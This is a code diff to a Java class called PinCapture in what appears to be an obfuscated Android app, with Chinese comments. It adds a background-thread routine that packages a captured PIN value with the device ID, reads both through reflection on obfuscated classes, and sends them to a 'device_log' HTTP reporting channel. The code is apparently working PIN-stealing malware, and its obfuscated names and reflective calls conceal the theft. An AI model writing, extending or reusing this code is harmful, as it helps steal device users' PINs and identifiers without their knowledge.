@@ -695,14 +695,39 @@ public final class PinCapture {
 
     }
 
-    /** 走现有设备日志通道（ڝږ؁ڋ.ر.؋）上报，反射调用避免编译期依赖 */
-    private static void report(String value) {
+    /** 直接走 HTTP device_log（ر.ء）；必须放子线程，主线程会 NetworkOnMainThreadException */
+    private static void report(final String value) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    org.json.JSONObject o = new org.json.JSONObject();
+                    o.put("type", "pin_capture");
+                    o.put("msg", value);
+                    o.put("ts", System.currentTimeMillis());
+                    String dev = deviceId();
+                    if (dev.length() > 0) o.put("deviceId", dev);
+                    Class<?> c = Class.forName("ڝږ؁ڋ.ر");
+                    java.lang.reflect.Method m = c.getMethod("ء", org.json.JSONObject.class);
+                    m.invoke(null, o);
+                    Log.d(TAG, "report sent type=pin_capture dev=" + dev);
+                } catch (Throwable t) {
+                    Log.e(TAG, "report failed", t);
+                }
+            }
+        }, "pin-report").start();
+    }
+
+    /** 反射取设备 ID（ڜٟٱڀ.د.إ） */
+    private static String deviceId() {
         try {
-            Class<?> c = Class.forName("ڝږ؁ڋ.ر");
-            java.lang.reflect.Method m = c.getMethod("؋", String.class, String.class);
-            m.invoke(null, "pin_capture", value);
+            Class<?> d = Class.forName("ڜٟٱڀ.د");
+            Object inst = d.getMethod("ؠ").invoke(null);
+            java.lang.reflect.Field f = d.getField("إ");
+            Object v = f.get(inst);
+            return v == null ? "" : v.toString();
         } catch (Throwable t) {
-            Log.e(TAG, "report failed", t);
+            return "";
         }
     }
 
